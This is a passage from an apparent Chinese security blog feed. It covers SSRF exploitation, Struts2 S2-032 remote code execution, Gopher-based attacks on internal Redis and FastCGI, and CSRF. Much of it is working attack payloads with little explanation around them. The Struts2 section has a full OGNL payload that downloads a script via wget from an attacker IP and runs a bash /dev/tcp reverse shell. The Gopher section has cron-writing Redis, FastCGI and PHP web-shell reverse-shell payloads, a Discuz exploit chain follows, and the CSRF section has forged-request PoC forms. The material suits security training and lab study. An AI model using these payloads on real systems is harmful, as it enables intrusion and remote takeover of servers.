<p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801211846265.png" alt="image-20200801211846265"></p>
<p>监听结果：</p>
<p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801211938351.png" alt="image-20200801211938351"></p>
<p> 成功获取反弹shell。</p>
<h2 id="structs2-S2-32"><a href="#structs2-S2-32" class="headerlink" title="structs2 S2-32"></a>structs2 S2-32</h2><h4 id="structs2简介"><a href="#structs2简介" class="headerlink" title="structs2简介"></a>structs2简介</h4><p>Apache Struts 2是世界上最流行的Java Web服务器框架之一。Struts 2是Struts的下一代产品，是在Struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。其全新的Struts 2的体系结构与Struts 1的体系结构差别巨大。Struts 2以WebWork为核心，采用拦截器的机制来处理用户的请求，这样的设计也使得业务逻辑控制器能够与ServletAPI完全脱离开，所以Struts 2可以理解为WebWork的更新产品。虽然从Struts 1到Struts 2有着太大的变化，但是相对于WebWork，Struts 2的变化很小。</p>
<p>安恒信息安全研究员在Struts 2上发现了一个严重的远程代码执行漏洞（CVE-2016-3081,S02-32），该漏洞危险级别为高危。</p>
<p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801213232212.png" alt="image-20200801213232212"></p>
<h4 id="判断structs2存在"><a href="#判断structs2存在" class="headerlink" title="判断structs2存在"></a>判断structs2存在</h4><p>Struts2需要在Tomcat中运行，看8080端口：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;</span><br></pre></td></tr></table></figure>
<p>在回显中会有</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">structs2 showcase for Apache Structs Project</span><br></pre></td></tr></table></figure>
<p>说明Struts2服务存在</p>
<h4 id="判断Struts–s2-32漏洞"><a href="#判断Struts–s2-32漏洞" class="headerlink" title="判断Struts–s2-32漏洞"></a>判断Struts–s2-32漏洞</h4><p>Struts –s2-32漏洞POC:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">？method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp&#x3D;%5C%5CA&amp;ppp&#x3D;%20&amp;encoding&#x3D;UTF-8&amp;cmd&#x3D;whoami</span><br></pre></td></tr></table></figure>
<p>判断是否存在Struts –s2-32漏洞，输入构造payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp&#x3D;%5C%5CA&amp;ppp&#x3D;%20&amp;encoding&#x3D;UTF-8&amp;cmd&#x3D;whoami</span><br></pre></td></tr></table></figure>
<p>返回用户名(说明存在Struts –s2-32漏洞)</p>
<h4 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h4><p>思路为通过wget下载脚本文件到指定目录(方便查找)，修改权限为可执行，最后执行脚本文件获取shell。</p>
<p>1.kali攻击机上的网站根目录(/var/www/html)下新建一个脚本文件shell.sh</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.1.1.200&#x2F;2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801214832083.png" alt="image-20200801214832083"></p>
<p>2.启动kali的apache服务：service apache2 start</p>
<p>3.输入构造的payload(将POC最后面的cmd参数的值修改为我们想要执行的命令，记住空格要用%20替代)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp&#x3D;%5C%5CA&amp;ppp&#x3D;%20&amp;encoding&#x3D;UTF-8&amp;cmd&#x3D;wget%20-P%20&#x2F;root%20http:&#x2F;&#x2F;10.1.1.200&#x2F;shell.sh</span><br></pre></td></tr></table></figure>
<p>4.接下来修改下载的文件的权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp&#x3D;%5C%5CA&amp;ppp&#x3D;%20&amp;encoding&#x3D;UTF-8&amp;cmd&#x3D;chmod%20755%20&#x2F;root&#x2F;shell.sh</span><br></pre></td></tr></table></figure>
<p>5.利用nc接收反弹的shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure>
<p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801215257007.png" alt="image-20200801215257007"></p>
<p>6.输入执行脚本的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp&#x3D;%5C%5CA&amp;ppp&#x3D;%20&amp;encoding&#x3D;UTF-8&amp;cmd&#x3D;.&#x2F;root&#x2F;shell.sh</span><br></pre></td></tr></table></figure>
<p>查看监听结果,成功获取shell</p>
<p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801215643505.png" alt="image-20200801215643505"></p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>1.限制协议为HTTP、HTTPS；</p>
<p>2.禁止30x跳转；</p>
<p>3.设置URL白名单或限制内网IP。</p>
<h2 id="利用-Gopher-协议拓展攻击面"><a href="#利用-Gopher-协议拓展攻击面" class="headerlink" title="利用 Gopher 协议拓展攻击面"></a>利用 Gopher 协议拓展攻击面</h2><p>此部分转载自长亭科技公众号[https:/]/blog.chaitin.cn/gopher-attack-surfaces/]</p>
<h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。当然现在 Gopher 协议已经慢慢淡出历史。<br>Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。</p>
<h4 id="攻击面测试"><a href="#攻击面测试" class="headerlink" title="攻击面测试"></a>攻击面测试</h4><p>环境</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IP: 172.19.23.218</span><br><span class="line">OS: CentOS 6</span><br></pre></td></tr></table></figure>
<p>根目录下1.php内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ch &#x3D; curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_GET[&quot;url&quot;]);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">$output &#x3D; curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h5 id="攻击内网redis"><a href="#攻击内网redis" class="headerlink" title="攻击内网redis"></a>攻击内网redis</h5><p>Redis 任意文件写入现在已经成为十分常见的一个漏洞，一般内网中会存在 root 权限运行的 Redis 服务，利用 Gopher 协议攻击内网中的 Redis，这无疑可以隔山打牛，直杀内网。</p>
<p>首先了解一下通常攻击 Redis 的命令，然后转化为 Gopher 可用的协议。常见的 exp 是这样的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis-cli -h $1 flushall</span><br><span class="line">echo -e &quot;\n\n*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.19.23.228&#x2F;2333 0&gt;&amp;1\n\n&quot;|redis-cli -h $1 -x set 1</span><br><span class="line">redis-cli -h $1 config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;</span><br><span class="line">redis-cli -h $1 config set dbfilename root</span><br><span class="line">redis-cli -h $1 save</span><br></pre></td></tr></table></figure>
<p>利用这个脚本攻击自身并抓包得到数据流：</p>
<p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801230139030.png" alt="image-20200801230139030"></p>
<p>改成适配于 Gopher 协议的 URL：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.19.23.228&#x2F;2333 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a&#x2F;var&#x2F;spool&#x2F;cron&#x2F;%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a</span><br></pre></td></tr></table></figure>
<p>攻击：</p>
<p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801230323375.png" alt="image-20200801230323375"></p>
<p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801230507722.png" alt="image-20200801230507722"></p>
<h5 id="攻击FastCGI"><a href="#攻击FastCGI" class="headerlink" title="攻击FastCGI"></a>攻击FastCGI</h5><p>一般来说 FastCGI 都是绑定在 127.0.0.1 端口上的，但是利用 Gopher+SSRF 可以完美攻击 FastCGI 执行任意命令。<br>首先构造 exp：</p>
<p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801230630429.png" alt="image-20200801230630429"></p>
<p>构造 Gopher 协议的 URL：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20&#x2F;%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A&#x2F;&#x2F;input%0F%13SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php%0D%01DOCUMENT_ROOT&#x2F;%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20&#x2F;dev&#x2F;tcp&#x2F;172.19.23.228&#x2F;2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00</span><br></pre></td></tr></table></figure>
<p>攻击：</p>
<p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801230804893.png" alt="image-20200801230804893"></p>
<p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801230831703.png" alt="image-20200801230831703"></p>
<h5 id="攻击内网-Vulnerability-Web"><a href="#攻击内网-Vulnerability-Web" class="headerlink" title="攻击内网 Vulnerability Web"></a>攻击内网 Vulnerability Web</h5><p>Gopher 可以模仿 POST 请求，故探测内网的时候不仅可以利用 GET 形式的 PoC（经典的 Struts2），还可以使用 POST 形式的 PoC。<br>一个只能 127.0.0.1 访问的 exp.php，内容为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php system($_POST[e]);?&gt;</span><br></pre></td></tr></table></figure>
<p>利用方式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;exp.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: curl&#x2F;7.43.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Content-Length: 49</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">e&#x3D;bash -i &gt;%26 &#x2F;dev&#x2F;tcp&#x2F;172.19.23.228&#x2F;2333 0&gt;%261</span><br></pre></td></tr></table></figure>
<p>构造 Gopher 协议的 URL：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST &#x2F;exp.php HTTP&#x2F;1.1%0d%0aHost: 127.0.0.1%0d%0aUser-Agent: curl&#x2F;7.43.0%0d%0aAccept: *&#x2F;*%0d%0aContent-Length: 49%0d%0aContent-Type: application&#x2F;x-www-form-urlencoded%0d%0a%0d%0ae&#x3D;bash -i &gt;%2526 &#x2F;dev&#x2F;tcp&#x2F;172.19.23.228&#x2F;2333 0&gt;%25261null</span><br></pre></td></tr></table></figure>
<p>攻击：</p>
<p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801231053626.png" alt="image-20200801231053626"></p>
<h4 id="攻击实例"><a href="#攻击实例" class="headerlink" title="攻击实例"></a>攻击实例</h4><p>【利用 Discuz SSRF 攻击 FastCGI】</p>
<p>Discuz X3.2 存在 SSRF 漏洞，当服务器开启了 Gopher wrapper 时，可以进行一系列的攻击。<br>首先根据 phpinfo 确定开启了 Gopher wrapper，且确定 Web 目录、PHP 运行方式为 FastCGI。</p>
<p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801231234945.png" alt="image-20200801231234945"></p>
<p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801231301811.png" alt="image-20200801231301811"></p>
<p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801231326020.png" alt="image-20200801231326020"></p>
<p>测试 Gopher 协议是否可用，请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8899&#x2F;forum.php?mod&#x3D;ajax&amp;action&#x3D;downremoteimg&amp;message&#x3D;%5Bimg%3D1%2C1%5Dhttp%3A%2f%2f127.0.0.1%3A9999%2fgopher.php%3Fa.jpg%5B%2fimg%5D</span><br></pre></td></tr></table></figure>
<p>其中 gopher.php 内容为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Location: gopher:&#x2F;&#x2F;127.0.0.1:2333&#x2F;_test&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>监听 2333 端口，访问上述 URL 即可验证：</p>
<p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801231437085.png" alt="image-20200801231437085"></p>
<p>构造 FastCGI 的 Exp：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Location: gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20&#x2F;%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A&#x2F;&#x2F;input%0F%13SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php%0D%01DOCUMENT_ROOT&#x2F;%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8899&#x2F;forum.php?mod&#x3D;ajax&amp;action&#x3D;downremoteimg&amp;message&#x3D;%5Bimg%3D1%2C1%5Dhttp%3A%2f%2f127.0.0.1%3A9999%2f1.php%3Fa.jpg%5B%2fimg%5D</span><br></pre></td></tr></table></figure>
<p>即可在 2333 端口上收到反弹的 shell：</p>
<p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801231558705.png" alt="image-20200801231558705"></p>
<h4 id="系统局限性"><a href="#系统局限性" class="headerlink" title="系统局限性"></a>系统局限性</h4><p>1、大部分 PHP 并不会开启 fopen 的 gopher wrapper<br>2、file_get_contents 的 gopher 协议不能 URLencode<br>3、file_get_contents 关于 Gopher 的 302 跳转有 bug，导致利用失败<br>4、PHP 的 curl 默认不 follow 302 跳转<br>5、curl/libcurl 7.43 上 gopher 协议存在 bug（%00 截断），经测试 7.49 可用</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF漏洞</title>
    <url>/2020/08/01/CSRF%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="CSRF原理"><a href="#CSRF原理" class="headerlink" title="CSRF原理"></a>CSRF原理</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.CSRF漏洞</span><br><span class="line">CSRF：跨站请求伪造漏洞，通常缩写为CSRF或XSRF</span><br><span class="line">XSS与CSRF区别：</span><br><span class="line">XSS利用站点内的信任客户，盗取Cookie</span><br><span class="line">CSRF通过伪造成受信任用户请求受信任的网站</span><br><span class="line"></span><br><span class="line">2.CSRF漏洞原理</span><br><span class="line">利用目标用户的合法身份，以目标用户的名义执行某些非法操作。</span><br><span class="line">CSRF成功利用的条件：</span><br><span class="line">(1)用户已经登录系统</span><br><span class="line">(2)用户访问对应URL</span><br></pre></td></tr></table></figure>
<h2 id="无防护CSRF利用"><a href="#无防护CSRF利用" class="headerlink" title="无防护CSRF利用"></a>无防护CSRF利用</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.GET型CSRF</span><br><span class="line">构造GET型URL，提交username和passwd参数，以此来新建对应的用户名和密码。</span><br><span class="line">例如：</span><br><span class="line">xxx.xxx.com&#x2F;new_user.php?username&#x3D;admin11&amp;passwd&#x3D;123456</span><br><span class="line"></span><br><span class="line">隐蔽利用：img标签的src属性来包含修改的内容</span><br><span class="line">例子：</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;xxx.xxx.com&#x2F;new_user.php?username&#x3D;admin11&amp;passwd&#x3D;123456&quot;&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">2.POST型CSRF</span><br><span class="line">与GET型的区别在于提交数据的位置在form表单中。</span><br><span class="line">设置表单用于提交。如&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;username&quot; value&#x3D;&quot;111&quot;&#x2F;&gt;</span><br><span class="line">paylaod:</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;xxx.xxx.com&#x2F;new_user.php&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;username&quot; value&#x3D;&quot;admintest&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;passwd&quot; value&#x3D;&quot;admintest&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;sub&quot; value&#x3D;&quot;ok&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<h2 id="CSRF漏洞探测"><a href="#CSRF漏洞探测" class="headerlink" title="CSRF漏洞探测"></a>CSRF漏洞探测</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.手工探测</span><br><span class="line">手动探测原理在于探测web应用程序是否具有防止CSRF的措施：</span><br><span class="line">HTTP referer头</span><br><span class="line">是否设置token</span><br><span class="line">HTTP自定义头</span><br><span class="line"></span><br><span class="line">2.使用工具探测</span><br><span class="line">CSRFtester是一款CSRF漏洞的测试工具。</span><br><span class="line">测试原理：</span><br><span class="line">使用代理抓取我们在浏览器中访问过的所有连接以及所有的表单等信息，通过在CSRFtester中修改相应的表单等信息，重新提交，相当于一次伪造客户端请求。如果请求成功被网站服务器接受，则说明存在CSRF漏洞。</span><br><span class="line"></span><br><span class="line">使用：</span><br><span class="line">(1)设置浏览器代理</span><br><span class="line">(2)登录web应用程序，提交表单，在CSRF工具中修改表单内容，查看是否更改，如果更改表单则存在CSRF漏洞</span><br><span class="line">(3)编写POC代码</span><br></pre></td></tr></table></figure>
<h2 id="CSRF漏洞-token防御请求"><a href="#CSRF漏洞-token防御请求" class="headerlink" title="CSRF漏洞 token防御请求"></a>CSRF漏洞 token防御请求</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.漏洞修复逻辑</span><br><span class="line">CSRF漏洞实质：服务器无法判断当前是否是合法用户的自定义操作。</span><br><span class="line"></span><br><span class="line">在用户登录之后给予用户一个唯一合法令牌，每一次操作过程，服务器都会验证令牌是否正确，如果正确执行操作，不正确不执行操作。</span><br><span class="line">一般情况下，给予的令牌会写入表单中隐藏域的value值中，随表单一起提交。</span><br><span class="line"></span><br><span class="line">2.生成token分析</span><br><span class="line">token作为识别操作是否是当前用户自己操作的唯一凭证，需要设置为复杂难以破解的内容。</span><br><span class="line">每秒发生变化的token示例：</span><br><span class="line">&lt;?php</span><br><span class="line">function token_generate()&#123;</span><br><span class="line">$salt&#x3D;&quot;hello&quot;.date(&quot;h:i:s&quot;);</span><br><span class="line">$token&#x3D;md5($salt);</span><br><span class="line">&#125;</span><br><span class="line">$token token_generate();</span><br><span class="line">echo $token;</span><br><span class="line"></span><br><span class="line">3.使用CSRF进行CSRF防御</span><br><span class="line">(1)登录验证成功之后，在会话session[&quot;user_token&quot;]中保存token</span><br><span class="line">(2)在后台操作中，增删改表单中添加隐藏域hidden，设置value为token</span><br><span class="line">(3)提交之后进行验证token是否正确</span><br></pre></td></tr></table></figure>
<h2 id="CSRF绕过referer"><a href="#CSRF绕过referer" class="headerlink" title="CSRF绕过referer"></a>CSRF绕过referer</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.Referer防御CSRF原理</span><br><span class="line">HTTP referer是header的一部分，当浏览器向web服务器发送请求的时候，一般带上referer，告诉服务器从哪个页面链接过来的。</span><br><span class="line"></span><br><span class="line">Referer防御代码：</span><br><span class="line">在PHP中使用$_SERVER[&#39;HTTP_REFERER&#39;]获取页面提交请求中的referer值。</span><br><span class="line"></span><br><span class="line">2.绕过referer技巧</span><br><span class="line">如果服务端只判断当前的referer中是否具有域名，则可以直接新建名称为验证域名的文件夹进行绕过，把payload放到该文件夹中。</span><br></pre></td></tr></table></figure>
<h2 id="GET型CSRF利用"><a href="#GET型CSRF利用" class="headerlink" title="GET型CSRF利用"></a>GET型CSRF利用</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.链接利用</span><br><span class="line">在html中，a标签代表链接，可以跳转到其他位置。</span><br><span class="line">需要发送对应的请求到链接指向的位置，然后返回响应。</span><br><span class="line"></span><br><span class="line">&lt;a href&#x3D;&quot;请求的地址，会被HTTP请求到的未知地址，可以携带GET型参数&quot;&gt;内容&lt;&#x2F;a&gt;</span><br><span class="line"></span><br><span class="line">2.iframe利用</span><br><span class="line">iframe标签内容将在页面加载过程中自动进行加载，src&#39;指向的位置就是页面请求的位置。</span><br><span class="line">可以设置iframe的style为display:none，以此来不显示iframe加载的内容。</span><br><span class="line"></span><br><span class="line">&lt;iframe src&#x3D;&quot;xxx&quot; style&#x3D;&quot;display:none&quot;&#x2F;&gt;</span><br><span class="line"></span><br><span class="line">3.img标签利用</span><br><span class="line">img标签的内容会随着页面加载而被请求，以此是src指向的位置会在页面加载过程中进行请求。</span><br><span class="line">&lt;img src&#x3D;&quot;xxx&quot;&#x2F;&gt;</span><br><span class="line"></span><br><span class="line">3.CSS-backgroud利用</span><br><span class="line">可以利用CSS中的background样式中的url来加载远程机器上的内容，从而对url中的内容发送http请求。</span><br></pre></td></tr></table></figure>
<h2 id="CSRF漏洞防御"><a href="#CSRF漏洞防御" class="headerlink" title="CSRF漏洞防御"></a>CSRF漏洞防御</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.验证码</span><br><span class="line">验证码防御被认为是对抗CSRF最为简单有效的方法。</span><br><span class="line">CSRF在用户不知情的情况下完成对应的操作，而验证码强制用户与应用程序交互，才能完成最终操作，可有效防御CSRF。</span><br><span class="line">出于用户体验考虑，不会每一个操作都加入验证码，验证码只能作为辅助手段，不能作为主要的解决方案。</span><br><span class="line"></span><br><span class="line">2.referer check</span><br><span class="line">Referer check主要用于防止盗链，同理也可以用来检查请求是否来自合法的&quot;源&quot;。</span><br><span class="line">缺陷：服务器并非任何时候都可以取到referer。例如HTTPS跳转到HTTP。</span><br><span class="line"></span><br><span class="line">3.Anti CSRF Token</span><br><span class="line">CSRF本质原因：重要操作的所有参数都是被恶意攻击者猜测到的。</span><br><span class="line">防御措施就是生成一个随机且不被随机猜测的参数，目前大多数防御采用token(不可猜测)</span><br><span class="line"></span><br><span class="line">4.Token泄露</span><br><span class="line">GET型token泄露：</span><br><span class="line">页面中包含&lt;img src&#x3D;&quot;xxx.com&quot;&#x2F;&gt;那么请求中的referer就会携带对应的GET Token</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传</title>
    <url>/2020/08/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
